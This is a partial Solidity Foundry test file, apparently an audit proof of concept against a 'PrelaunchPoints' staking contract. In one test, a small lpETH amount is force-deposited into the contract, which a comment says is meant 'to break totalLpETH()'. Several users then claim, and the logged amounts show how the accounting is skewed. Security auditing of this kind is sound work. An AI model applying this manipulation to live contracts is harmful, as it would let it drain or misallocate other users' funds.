...
contract PrelaunchPointsTest is Test {
    ...
    // result from test:
    function testDebugClaim() public {
        uint256 lockAmount = 15e18;

        // bytes memory _data_randomUser = hex"";
        bytes memory _data =
            hex"";
        //1000000000000000000
        lockAmount = bound(lockAmount, 1, 1e36);
        vm.deal(address(this), lockAmount);
        prelaunchPoints.lockETH{value: lockAmount}(referral);
        lrt.mint(address(this), lockAmount);
        lrt.approve(address(prelaunchPoints), lockAmount);
        prelaunchPoints.lock(address(lrt), lockAmount, referral);
        ...
        vm.breakpoint("p");
        prelaunchPoints.claim(address(lrt), 100, PrelaunchPoints.Exchange.UniswapV3, _data);
    ...
    function testClaimSeveralUsers() public {
        uint256 lockAmount = 69468279501414141417;
        uint256 lockAmount1 = 69468279501414141413;
        uint256 lockAmount2 = 69468279501414141413;

        address user1 = vm.addr(1);
        address user2 = vm.addr(2);
        address user3 = vm.addr(3);

        vm.deal(user3, lockAmount);
        ...
        prelaunchPoints.setLoopAddresses(address(lpETH), address(lpETHVault));
        vm.warp(prelaunchPoints.loopActivation() + prelaunchPoints.TIMELOCK() + 1);
        //get 1 wei lpETH token and transfer it to launchPoints to break totalLpETH()
        uint256 forceTransferAmount = 111111111 wei;
        vm.deal(address(this), forceTransferAmount);
        lpETH.deposit{value: forceTransferAmount}(address(prelaunchPoints));
        prelaunchPoints.convertAllETH();
        console.log("totalLpETH ", prelaunchPoints.totalLpETH());
        console.log("totalSupply", prelaunchPoints.totalSupply());

        vm.warp(prelaunchPoints.startClaimDate() + 1);

        vm.prank(user1);        
        prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);
        console.log("claim1 deposit: %s , claimed: %s", lockAmount1, lpETH.balanceOf(user1));
        vm.prank(user2);
        prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);
        console.log("claim2 deposit: %s , claimed: %s", lockAmount2, lpETH.balanceOf(user2));
        vm.prank(user3);
        prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);
        console.log("claim3 deposit: %s , claimed: %s", lockAmount, lpETH.balanceOf(user3));
        console.log("left:",lpETH.balanceOf(address(prelaunchPoints)));
    }
